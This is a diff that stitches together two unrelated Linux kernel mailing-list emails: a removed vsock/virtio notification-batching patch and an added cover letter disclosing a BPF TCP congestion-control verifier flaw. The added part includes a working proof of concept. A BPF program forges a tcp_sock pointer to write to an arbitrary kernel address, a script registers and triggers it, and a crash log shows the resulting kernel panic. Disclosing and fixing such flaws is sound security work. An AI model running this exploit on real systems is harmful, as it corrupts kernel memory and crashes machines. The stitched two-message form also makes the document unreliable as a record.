@@ -1,86 +1,79 @@
-Received: from mail-pg1-f170.google.com (mail-pg1-f170.google.com [209.85.215.170])
+Received: from mail-dy1-f175.google.com (mail-dy1-f175.google.com [74.125.82.175])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9D4903B47DD
-	for <netdev@vger.kernel.org>; Wed, 14 Oct 2026 11:57:19 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.170
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id BFD5847F3B8
+	for <netdev@vger.kernel.org>; Wed, 14 Oct 2026 11:58:11 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.175
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1791979044; cv=none; b=UNWQVmnL/lBDWoP7Uu8YAmVa0aBmfHFGMm0pqSq2dotkGbFjzoFzY+RC7WJYmOtxPKW4Vgc/lYv4oCf5xTTYszhXhvYKTXG4zznml9wbthLYEu0Ym1uzFzdnNh7EpH5Rl6VjxfMUtx4nFBuQUL/0Y5D0vXePQSh7icwMMDGf2P4=
+	t=1791979093; cv=none; b=QUTCKscEQGVPPgmncSCBaI/anD6GyTN0OqdpE44fmfRI5ynm32NuJ8qMpj3KFpPYTkhHOYYdiCDP1hx3O1OrO2rqBerKs1d0JAFu/45cST1WOf57b4J2xs1NCZXJ6r3My8KizgQKf2rozZALdP5KwJjyBNTEXt4+fC1yDdKadAM=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1791979044; c=relaxed/simple;
-	bh=UT+gUDWpvYvdUO59q70uyFIuGW+1dknIwp9YCivhP4c=;
-	h=From:To:Cc:Subject:Date:Message-Id:In-Reply-To:References:
-	 MIME-Version; b=k+b3KtmDRuv2Av7LE+N2UzbbQFDkSBy9+Irfitn6bxlsT0XENwfA1XVcsoUMTmzCitbYRHl+Lgj9xrPZgZRpf7Ovb7WHOBlbVfHKhGTelxY1dgPZMUNxunqqVexfjWmVbDXVex4jRPi/wBu0jvFyqjmi3qzXbjZPemMyqRA4NM0=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=aDe5riTH; arc=none smtp.client-ip=209.85.215.170
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	s=arc-20240116; t=1791979093; c=relaxed/simple;
+	bh=fN90NoktBZxvWdW7c2Pd81oD1LmhsKp4TuYRHks3dis=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=Z7T2GRapMbxI0aClu5y71IKKWbs2ntMjROUw1rvzOKBIGnFI83rlr1ut2bGiMBFwmnFl1N0j3kBtYqSawUr9LPpy1AKcbiAM7VkilHFbYiFwt7yHwmUpA6Li6PK4iDCSw+w39fNdYj+Zb2e2VsE1Lwx6FgLzEW0zCAxOhpfNQ3Y=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=IzEknwKR; arc=none smtp.client-ip=74.125.82.175
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="aDe5riTH"
-Received: by mail-pg1-f170.google.com with SMTP id 41be03b00d2f7-ccce6d9abfeso2267563a12.1
-        for <netdev@vger.kernel.org>; Wed, 14 Oct 2026 04:57:19 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="IzEknwKR"
+Received: by mail-dy1-f175.google.com with SMTP id 5a478bee46e88-35d0be18c71so741169eec.1
+        for <netdev@vger.kernel.org>; Wed, 14 Oct 2026 04:58:11 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1791979039; x=1792583839; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:references:in-reply-to
-         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
-         :message-id:reply-to:content-type;
-        bh=DeRAz8u7YOmHATBxCqeG7zchbKWr3JF2MUxcRFYnHbo=;
-        b=aDe5riTHp27jFVIfMsUREA6JlInM+8kjINyhyZFbJnpTKXbBjcQlk8M5YiuOXwOfm1
-         PKH3qToWErUfd0AsyFi3ZvfL56NmHanHdCeA2g82ZCx9O7bCSndmHXpXOOxC/4ANoW1+
-         emNmmQkqHYL9gtE83Rl68ss3EdCcH8IXd5IdPhXT8+8JavXucJJIr6OII6tZpTXi9Bww
-         uvq41O/4Cd55vwYLkCqIbwia0exgqJRuL4XceF+znVAryjNH2aQsvZUpUdU9DfnMZfyG
-         9WyDXrPghcnfD9p7esvp9HYQLSORyOXxTMg08zHJIg7nv05ObaZIBgh+FKHVo7ct5lIY
-         2G5g==
+        d=nebusec.ai; s=google; t=1791979091; x=1792583891; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=xPru/NnWWFQNbeuTwcG8xYtjhV3tu9JBcVGwz1PvuPU=;
+        b=IzEknwKRNaASG8JUVjXWCmDQJPBV1vKJK/maU5x+oC0iqEFoO/pj5u46+s/i0ekyb3
+         uq7nnoz8ZGmhQirVp8W9dxGSHhuR6yxOUy81uGfPug78nVmQVqg/KAa76+DjBzN9Qlxq
+         Aeei8Sh6oXA7xakg78wSmwK3OxnVlJ0Vu8v1XyWkSmRZuKdR3WKPu1zdsLUn/HlP0YkS
+         u0HimeIq2XdIGi24SEiqB3Ed4RrPbpRTEih/ydQDPRZtlWqhibStq2Y7SEMl4SveZ/RA
+         2yx68+2sQJJdZvbpFFE+YYo8DKN5K9jSxZUQfBT259U8U7tbbUXucCkPDSL9O8GB+gdQ
+         trTA==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1791979039; x=1792583839;
-        h=content-transfer-encoding:mime-version:references:in-reply-to
-         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
-         :to:cc:subject:date:message-id:reply-to:content-type;
-        bh=DeRAz8u7YOmHATBxCqeG7zchbKWr3JF2MUxcRFYnHbo=;
-        b=IfX4TrG4sBoIJKGHjpauAkffrqKgiRNrpEe8juDCPfeOfNC+8rgn63GT1CVhuVSh43
-         Rib4xUkWn+NS4AWU369CuoROT5LVlydkA6sW8PjT3F6CA3aFK8P4Dhw2eLpkGWnO+bbx
-         VsvOzc3RBKt8uNAtzAX8jN03/negX/3xuoXqiUhL5KoAXVoC/aDOyHLoDBqH9BcjBMOs
-         T//DaTEAuX1faadr3o1old3mQaUE/6/pHWWngEEwMCMAcSubK49NucvJK4A4nJx7NIwY
-         6LW1pudYjO3L2ToYwiLtPsZ4un26OVy1Cw6/pq+Pguv5qypTcCf5euAc2SvrEfT5FozB
-         7WoQ==
-X-Forwarded-Encrypted: i=1; AKwUvBwuYRVBkERsKZL2RxBBBhME0a1iwtNTxnItVIBnQFqgvD+envglTMfYZoJiOFvnfafLmpOkuSI=@vger.kernel.org
-X-Gm-Message-State: AFq9FYKn1y8YXrg+KTGEtoBGp6KhB+cYWE3TJDo36ExbQ3aWq4wJpMlM
-	IhB2RtvHNKgyBvjATw6kZVua15L4K1951VqNoVsQNApcOngVEAarEYYO
-X-Gm-Gg: AYBFou1heGtKDc8NP5MjYQjz4gZJsBWYn9UDtzOF/Adgu48iWnnVFcGBj40vNmBjDxD
-	KXXZwpYkjMnNE38WjasGEZGE0hP+aNl3hvpKii0jHRH0QeDZBFZ7S46hYCQxXjj/53x2iWKuLPM
-	uDxLjvHFZQ9RgFB2KqHbrjGeUN3orB1B5+hDao3+ahyMP/izs3sc54MkGxMGoIOLEy+Phxm5bBL
-	FSGsTYeqnnbuFAzxk+frVtynpyJjCeqbyFaLvWmE7NI1B1WVPaOHrHoH5UlAsQv2EADJuoE3zTB
-	AKj3uqQCOb/rOs4MRtrAWZjidygmepybvZYgLviR/VrT1eVpeF/6SJIUf2vIxdi0ZHt/cCIzxNf
-	V7zVyuMfAIwFEG+TTW4QLh1IXEauRTvh0Bl3gdtzExClO5iyqbCl5J274+LRaR1X9e7FoZqegiH
-	qdahX8SZC1SVcsUlxxMzfErETCZjrYdlakUIa8sDzUeFS3wv1dlb3Vv7aMStws3kDEiJinyg==
-X-Received: by 2002:a17:90b:55c3:b0:3ac:3e42:60a2 with SMTP id 98e67ed59e1d1-3ac3e426341mr4595338a91.33.1791979038286;
-        Wed, 14 Oct 2026 04:57:18 -0700 (PDT)
-Received: from gmail.com ([188.253.12.32])
-        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3ac5f24b74csm4795691a91.7.2026.10.14.04.57.12
+        d=1e100.net; s=20260707; t=1791979091; x=1792583891;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=xPru/NnWWFQNbeuTwcG8xYtjhV3tu9JBcVGwz1PvuPU=;
+        b=FlyIHAiffZUSfhiud9+CVE9Ux5lMGeqmiDaq17VpvPf3WGd1U7bg3rmEKzpRxHhZIS
+         ra6ZNBdQWq8AqtKOjIO0v3bPmD6Ia0ZkgYV2p6Cl1hZPGF2e0HiKDX8VgJ0Ze6LqrtQ2
+         wMnHiPQnMpJxq8wt752E36EZEXkG7rLknG+JnVUV+TCz02I8neO5I7J8GaH3teUh0Okv
+         3sgdeX4fxe15Qg1Cs6Lo/l3fLJ+0SR9pDGXUE2w2BIxuChsHUfYJ5q7Qq0hhOtlPYpzY
+         Xl8b1PzlaMds3GYKggdsoPgjz44zcRI49ZdEtbKgZFkO8tsbe5iHTuYq6KRz1TPf/2Wf
+         /I2Q==
+X-Gm-Message-State: AFq9FYISG1Kuv0B/9pVtBd6SG5KsOP9hbgtHo+LSc0JDE/saHi0ULP+W
+	Bwpo+UcGYQpy3qp2s3KeRK8FuJ1/RV1LGRUqNQr8z8iGfa3p2uz5gHd7BSWGGKV1ebZ6UYgqI9s
+	xQ8nC5EtoYpk=
+X-Gm-Gg: AYBFou20hHXU0smYAvqddfaLirJHfJP8IkJsSFS7BS6L5bgXmpDfeOIe3Q5JYh4o3go
+	iVYB5KEeCdMUvHdMIFFepdVVNDvtrxgaZkr01UU6wh4kShOvX5JWEYSBpgJzHKMrvIm3n/556a3
+	D3IQwgRjlZ3jH4jO7Si0+J7lRPdSL9iWqVn/2BUfU826A4CCpY/tfUbREMLRASwKN8wJWpzaIPK
+	ZXLR+cum09cR9Pyb9RK7C5l8FAEsmqCltxNBwpqwV8SuUQ1kbF4/MJEMwJh+QMQDGK4YaemML78
+	vOeD07SnP1rlwkc7s9tRBVJ+sPBVPy06BhqcRBOzWelOgqNaL2KrBeJ1smo7AtiTzx5jsttVN3p
+	5C7U3ehgq9TNG0hE9wm5XKkFhpMrWXLn1FeX2oMBDy/AUA/WWMAtQr84rCh2WPqnvupXsj0Yrgs
+	zJGjTSCMs6ePhVbX0x3AdzEEEt8PpiKEL/ukNS9hXBpy0jP5Bus6upmfP1LnMNe7yhO3HzojmCj
+	6OWSivNnaZMO/yuUA==
+X-Received: by 2002:a05:7301:29b3:b0:351:77a3:55f1 with SMTP id 5a478bee46e88-3536c593e65mr22787371eec.19.1791979090340;
+        Wed, 14 Oct 2026 04:58:10 -0700 (PDT)
+Received: from Roxy.sysu.edu.cn ([2602:feda:30:ae86:295:dff:fe84:68f4])
+        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-35977229a6esm37796346eec.8.2026.10.14.04.58.06
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Wed, 14 Oct 2026 04:57:18 -0700 (PDT)
-From: Jia Jia <physicalmtea@gmail.com>
-To: stefanha@redhat.com,
-	sgarzare@redhat.com
-Cc: mst@redhat.com,
-	jasowangio@gmail.com,
-	eperezma@redhat.com,
-	xuanzhuo@linux.alibaba.com,
-	davem@davemloft.net,
+        Wed, 14 Oct 2026 04:58:09 -0700 (PDT)
+From: Zhiling Zou <zhilinz@nebusec.ai>
+To: netdev@vger.kernel.org,
+	bpf@vger.kernel.org
+Cc: davem@davemloft.net,
 	edumazet@kernel.org,
-	kuba@kernel.org,
 	pabeni@redhat.com,
 	horms@kernel.org,
-	virtualization@lists.linux.dev,
-	kvm@vger.kernel.org,
-	netdev@vger.kernel.org,
-	linux-kernel@vger.kernel.org,
-	bobbyeshleman@gmail.com
-Subject: [PATCH net-next v4 4/4] vsock/virtio: defer RX notifications until batch unlock
-Date: Wed, 14 Oct 2026 19:56:40 +0800
-Message-Id: <20261014115640.184286-5-physicalmtea@gmail.com>
-X-Mailer: git-send-email 2.34.1
-In-Reply-To: <20261014115640.184286-1-physicalmtea@gmail.com>
-References: <20261014115640.184286-1-physicalmtea@gmail.com>
+	zhilinz@nebusec.ai,
+	martin.lau@kernel.org,
+	kafai.wan@linux.dev,
+	yhs@fb.com,
+	ast@kernel.org,
+	vega@nebusec.ai
+Subject: [PATCH net 0/1] bpf: reject unsafe pointers in TCP congestion control access
+Date: Wed, 14 Oct 2026 19:57:56 +0800
+Message-ID: <cover.1791978740.git.zhilinz@nebusec.ai>
+X-Mailer: git-send-email 2.55.0
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -89,171 +82,214 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-An RX batch can make a socket readable while the worker still holds its
-socket lock. Waking a blocking reader then only moves it to waiting for
-the same lock.
+Hi Linux kernel maintainers,
 
-Record the existing low-watermark condition and notify once after
-release_sock(). Move the coalesced write-space notification after the
-unlock as well, since both callbacks wake sk_sleep(sk). Deliver
-write-space before data-ready and keep the lookup reference until both
-callbacks complete.
+We found and validated an issue in net/ipv4/bpf_tcp_ca.c. A root user
+with the capabilities required for BPF struct_ops can load a TCP
+congestion-control program that writes through a forged tcp_sock pointer.
+We've tested it, and it should not affect any other functionality.
 
-As with write-space, save the initial sk_data_ready callback and batch only
-while both saved callbacks remain installed. Sockets with replaced
-callbacks retain their per-packet behavior.
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-The existing psock-marker check also covers a concurrent sockmap attach:
-at most the already admitted packet completes on the native path, and the
-next packet ends the batch.
+---- details below ----
 
-Signed-off-by: Jia Jia <physicalmtea@gmail.com>
----
- include/linux/virtio_vsock.h            |  1 +
- include/net/af_vsock.h                  |  5 ++--
- net/vmw_vsock/af_vsock.c                |  1 +
- net/vmw_vsock/virtio_transport_common.c | 35 ++++++++++++++++++-------
- 4 files changed, 31 insertions(+), 11 deletions(-)
+Bug details:
 
-diff --git a/include/linux/virtio_vsock.h b/include/linux/virtio_vsock.h
-index bf077ee0ded88..f1396ca3ad9b5 100644
---- a/include/linux/virtio_vsock.h
-+++ b/include/linux/virtio_vsock.h
-@@ -288,6 +288,7 @@ struct virtio_transport_rx_batch {
- 	unsigned int pkts;
- 	size_t bytes;
- 	bool write_space_pending;
-+	bool data_ready_pending;
- };
- 
- void virtio_transport_recv_pkt_batch(struct virtio_transport *t,
-diff --git a/include/net/af_vsock.h b/include/net/af_vsock.h
-index 9a40960d10cbe..78bab5820f528 100644
---- a/include/net/af_vsock.h
-+++ b/include/net/af_vsock.h
-@@ -64,9 +64,10 @@ struct vsock_sock {
- 	bool sent_request;
- 	bool ignore_connecting_rst;
- 	/*
--	 * Initial callback, used to identify replacements and deliver deferred
--	 * write-space notifications.
-+	 * Initial callbacks, used to identify replacements and deliver deferred
-+	 * notifications.
- 	 */
-+	void (*default_data_ready)(struct sock *sk);
- 	void (*default_write_space)(struct sock *sk);
- 
- 	/* Protected by lock_sock(sk) */
-diff --git a/net/vmw_vsock/af_vsock.c b/net/vmw_vsock/af_vsock.c
-index fe7f49da6c4bc..f40659ec29df0 100644
---- a/net/vmw_vsock/af_vsock.c
-+++ b/net/vmw_vsock/af_vsock.c
-@@ -958,6 +958,7 @@ static struct sock *__vsock_create(struct net *net,
- 		sk->sk_type = type;
- 
- 	vsk = vsock_sk(sk);
-+	vsk->default_data_ready = sk->sk_data_ready;
- 	vsk->default_write_space = sk->sk_write_space;
- 	vsock_addr_init(&vsk->local_addr, VMADDR_CID_ANY, VMADDR_PORT_ANY);
- 	vsock_addr_init(&vsk->remote_addr, VMADDR_CID_ANY, VMADDR_PORT_ANY);
-diff --git a/net/vmw_vsock/virtio_transport_common.c b/net/vmw_vsock/virtio_transport_common.c
-index f4b5f0230493e..8b62b789b71c5 100644
---- a/net/vmw_vsock/virtio_transport_common.c
-+++ b/net/vmw_vsock/virtio_transport_common.c
-@@ -1588,7 +1588,8 @@ virtio_transport_recv_enqueue(struct vsock_sock *vsk,
- 
- static int
- virtio_transport_recv_connected(struct sock *sk,
--				struct sk_buff *skb)
-+				struct sk_buff *skb,
-+				bool *data_ready_pending)
- {
- 	struct virtio_vsock_hdr *hdr = virtio_vsock_hdr(skb);
- 	struct vsock_sock *vsk = vsock_sk(sk);
-@@ -1607,7 +1608,13 @@ virtio_transport_recv_connected(struct sock *sk,
- 			vsock_remove_sock(vsk);
- 			break;
- 		}
--		vsock_data_ready(sk);
-+		if (!data_ready_pending) {
-+			vsock_data_ready(sk);
-+		} else if (!*data_ready_pending &&
-+			   (vsock_stream_has_data(vsk) >= sk->sk_rcvlowat ||
-+			    sock_flag(sk, SOCK_DONE))) {
-+			*data_ready_pending = true;
-+		}
- 		return err;
- 	case VIRTIO_VSOCK_OP_CREDIT_REQUEST:
- 		virtio_transport_send_credit_update(vsk);
-@@ -1820,6 +1827,7 @@ virtio_transport_recv_pkt_batchable(struct virtio_transport *t,
- 	return sk->sk_state == TCP_ESTABLISHED &&
- 	       sk->sk_type == SOCK_STREAM &&
- 	       READ_ONCE(sk->sk_prot) == sk->sk_prot_creator &&
-+	       READ_ONCE(sk->sk_data_ready) == vsk->default_data_ready &&
- 	       READ_ONCE(sk->sk_write_space) == vsk->default_write_space &&
- 	       !sock_flag(sk, SOCK_DONE) &&
- 	       vsk->transport == &t->transport &&
-@@ -1830,8 +1838,9 @@ virtio_transport_recv_pkt_batchable(struct virtio_transport *t,
- /*
-  * The caller holds sk's socket lock.  Set @batchable if the socket can remain
-  * locked for another ordinary STREAM/RW packet.  When @batch is non-NULL,
-- * record a default write-space notification for batch finish instead of
-- * delivering it immediately.  Return true if the caller must free @skb.
-+ * record default write-space and data-ready notifications for batch finish
-+ * instead of delivering them immediately.  Return true if the caller must
-+ * free @skb.
-  */
- static bool
- virtio_transport_recv_pkt_locked(struct virtio_transport *t,
-@@ -1883,7 +1892,9 @@ virtio_transport_recv_pkt_locked(struct virtio_transport *t,
- 		kfree_skb(skb);
- 		break;
- 	case TCP_ESTABLISHED:
--		virtio_transport_recv_connected(sk, skb);
-+		virtio_transport_recv_connected(sk, skb,
-+						batch ?
-+						&batch->data_ready_pending : NULL);
- 		break;
- 	case TCP_CLOSING:
- 		virtio_transport_recv_disconnecting(sk, skb);
-@@ -1957,27 +1968,33 @@ EXPORT_SYMBOL_GPL(virtio_transport_recv_pkt);
- /*
-  * Finish the RX batch.
-  * For a non-empty batch, the caller holds the socket lock acquired with
-- * lock_sock(). Deliver any deferred write-space notification while the lock
-- * is held, then release the lock and the batch's lookup reference.
-- * An empty batch is a no-op.
-+ * lock_sock(). Release the lock, deliver any deferred write-space and
-+ * data-ready notifications in that order, then drop the batch's lookup
-+ * reference. An empty batch is a no-op.
-  */
- void virtio_transport_rx_batch_finish(struct virtio_transport_rx_batch *batch)
- {
- 	bool write_space_pending = batch->write_space_pending;
-+	bool data_ready_pending = batch->data_ready_pending;
- 	struct sock *sk = batch->sk;
- 
- 	batch->sk = NULL;
- 	batch->pkts = 0;
- 	batch->bytes = 0;
- 	batch->write_space_pending = false;
-+	batch->data_ready_pending = false;
- 
- 	if (!sk)
- 		return;
- 
-+	release_sock(sk);
-+
- 	if (write_space_pending)
- 		vsock_sk(sk)->default_write_space(sk);
- 
--	release_sock(sk);
-+	if (data_ready_pending)
-+		vsock_sk(sk)->default_data_ready(sk);
-+
- 	sock_put(sk);
- }
- EXPORT_SYMBOL_GPL(virtio_transport_rx_batch_finish);
+bpf_rdonly_cast() returns a BTF pointer with PTR_UNTRUSTED. Generic BPF
+store verification delegates writes through BTF pointers to the program
+type's btf_struct_access callback. bpf_tcp_ca_btf_struct_access() checks
+the BTF type and allowlisted member offset, but does not reject unsafe
+pointer modifiers.
+
+A BPF TCP struct_ops program can therefore cast a scalar address to a
+struct tcp_sock pointer and write through an allowed member such as
+sk_pacing_rate. The PoC biases the fake base so the store targets address
+0x1000; the supplied KASAN log shows the resulting kernel-mode write
+fault in the struct_ops init callback.
+
+Reject pointers with unsafe modifiers before validating their BTF type
+and member offset. Trusted struct_ops context pointers retain the
+existing write access to the permitted TCP fields.
+
+Reproducer:
+
+    ./poc.sh
+
+The supplied poc.bpf.o is used by the script. It requires bpftool and
+Python 3 in the guest. We ran it as root in a 2 vCPU, 2 GB QEMU guest.
+
+------BEGIN poc.bpf.c------
+
+    // SPDX-License-Identifier: GPL-2.0
+
+    #include "vmlinux.h"
+    #include <bpf/bpf_core_read.h>
+    #include <bpf/bpf_helpers.h>
+    #include <bpf/bpf_tracing.h>
+    #include "bpf_kfuncs.h"
+
+    char LICENSE[] SEC("license") = "GPL";
+
+    #define TARGET_ADDR 0x1000UL
+    #define WRITE_VALUE 0x4141414141414141UL
+
+    SEC("struct_ops/init")
+    void BPF_PROG(poc_init, struct sock *sk)
+    {
+    	unsigned long base;
+    	struct sock *fake;
+
+    	base = TARGET_ADDR - __builtin_offsetof(struct sock, sk_pacing_rate);
+    	fake = bpf_rdonly_cast((const void *)base,
+    			       bpf_core_type_id_kernel(struct tcp_sock));
+    	fake->sk_pacing_rate = WRITE_VALUE;
+    }
+
+    SEC("struct_ops/cong_avoid")
+    void BPF_PROG(poc_cong_avoid, struct sock *sk, u32 ack, u32 acked)
+    {
+    }
+
+    SEC("struct_ops/ssthresh")
+    u32 BPF_PROG(poc_ssthresh, struct sock *sk)
+    {
+    	return 0;
+    }
+
+    SEC("struct_ops/undo_cwnd")
+    u32 BPF_PROG(poc_undo_cwnd, struct sock *sk)
+    {
+    	return 0;
+    }
+
+    SEC(".struct_ops")
+    struct tcp_congestion_ops poc_ca = {
+    	.init = (void *)poc_init,
+    	.cong_avoid = (void *)poc_cong_avoid,
+    	.ssthresh = (void *)poc_ssthresh,
+    	.undo_cwnd = (void *)poc_undo_cwnd,
+    	.name = "k9v_poc",
+    };
+
+------END poc.bpf.c--------
+
+------BEGIN bpf_kfuncs.h------
+
+    #ifndef __POC_BPF_KFUNCS_H
+    #define __POC_BPF_KFUNCS_H
+
+    extern void *bpf_rdonly_cast(const void *obj, __u32 btf_id) __ksym __weak;
+
+    #endif
+
+------END bpf_kfuncs.h--------
+
+------BEGIN poc.sh------
+
+    #!/bin/sh
+    set -eux
+
+    DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
+    cd "$DIR"
+
+    if [ ! -f poc.bpf.o ]; then
+    	if command -v clang >/dev/null 2>&1; then
+    		make clean
+    		make
+    	else
+    		echo "missing poc.bpf.o and no clang available to rebuild it" >&2
+    		exit 1
+    	fi
+    fi
+
+    bpftool struct_ops register ./poc.bpf.o
+
+    python3 - <<'PY'
+    import socket
+    import threading
+    import time
+
+    ALG = b"k9v_poc"
+    ready = threading.Event()
+    port_box = {}
+
+
+    def server():
+        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        srv.bind(("127.0.0.1", 0))
+        port_box["port"] = srv.getsockname()[1]
+        srv.listen(1)
+        ready.set()
+        conn, _ = srv.accept()
+        time.sleep(5)
+        conn.close()
+        srv.close()
+
+
+    threading.Thread(target=server, daemon=True).start()
+    ready.wait()
+
+    cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    cli.connect(("127.0.0.1", port_box["port"]))
+    cli.setsockopt(socket.IPPROTO_TCP, socket.TCP_CONGESTION, ALG)
+    PY
+
+------END poc.sh--------
+
+----BEGIN crash log----
+
+[  900.010015][T10750] BUG: unable to handle page fault for address: 0000000000001000
+[  900.010735][T10750] #PF: supervisor write access in kernel mode
+[  900.011201][T10750] #PF: error_code(0x0002) - not-present page
+[  900.011675][T10750] PGD 10f17b067 P4D 10f17b067 PUD 1121c2067 PMD 0
+[  900.012209][T10750] Oops: Oops: 0002 [#1] PREEMPT SMP KASAN NOPTI
+[  900.012693][T10750] CPU: 2 UID: 0 PID: 10750 Comm: python3 Not tainted 6.12.95 #2
+[  900.013186][T10750] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  900.013972][T10750] RIP: 0010:bpf_prog_861704879f83f62f_poc_init+0x2b/0x38
+[  900.014455][T10750] Code: 0f 1e fa 0f 1f 44 00 00 0f 1f 00 55 48 89 e5 f3 0f 1e fa bf 90 0c 00 00 be 85 ab 00 00 48 89 f8 48 bf 41 41 41 41 41 41 41 41 <48> 89 b8 70 03 00 00 c9 e9 4b 5e 6f ea cc cc cc cc cc cc cc cc cc
+[  900.015700][T10750] RSP: 0018:ffffc900066dfb58 EFLAGS: 00010202
+[  900.016102][T10750] RAX: 0000000000000c90 RBX: 0000000000000001 RCX: 0000000000000000
+[  900.016617][T10750] RDX: 1ffff92000cdbf6e RSI: 000000000000ab85 RDI: 4141414141414141
+[  900.017128][T10750] RBP: ffffc900066dfb58 R08: 0000000000000000 R09: fffffbfff2c69990
+[  900.017641][T10750] R10: ffffffff9634cc87 R11: 0000000000000002 R12: ffff88810b72a278
+[  900.018210][T10750] R13: ffff88801d8fc340 R14: ffff88810b72a278 R15: ffff88810b72a2a8
+[  900.018843][T10750] FS:  00007f2b2a2d8780(0000) GS:ffff888118b00000(0000) knlGS:0000000000000000
+[  900.019539][T10750] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  900.020009][T10750] CR2: 0000000000001000 CR3: 000000007cca4000 CR4: 0000000000750ef0
+[  900.020633][T10750] PKRU: 55555554
+[  900.020913][T10750] Call Trace:
+[  900.021183][T10750]  <TASK>
+[  900.021434][T10750]  bpf__tcp_congestion_ops_init+0x47/0xa7
+[  900.021880][T10750]  tcp_init_congestion_control+0xa7/0x3b0
+[  900.022412][T10750]  tcp_set_congestion_control+0x6a9/0x7c0
+[  900.022838][T10750]  do_tcp_setsockopt+0x5c0/0x2170
+[  900.023230][T10750]  ? __pfx_do_tcp_setsockopt+0x10/0x10
+[  900.023579][T10750]  ? __pfx___might_resched+0x10/0x10
+[  900.024056][T10750]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  900.024523][T10750]  ? aa_sk_perm+0x1d8/0x8d0
+[  900.024956][T10750]  ? __pfx___lock_acquire+0x10/0x10
+[  900.025389][T10750]  ? __pfx_aa_sk_perm+0x10/0x10
+[  900.025777][T10750]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  900.026212][T10750]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  900.026662][T10750]  ? find_held_lock+0x2d/0x110
+[  900.027002][T10750]  do_sock_setsockopt+0x1b8/0x3b0
+[  900.046958][T10750] Kernel panic - not syncing: Fatal exception
+[  900.047768][T10750] Kernel Offset: disabled
+[  900.048106][T10750] Rebooting in 86400 seconds..
+
+-----END crash log-----
+
+Best regards,
+Zhiling Zou
+
+Zhiling Zou (1):
+  bpf: reject unsafe pointers in TCP congestion control access
+
+ net/ipv4/bpf_tcp_ca.c | 5 +++++
+ 1 file changed, 5 insertions(+)
+
 -- 
-2.53.0
+2.55.0
 
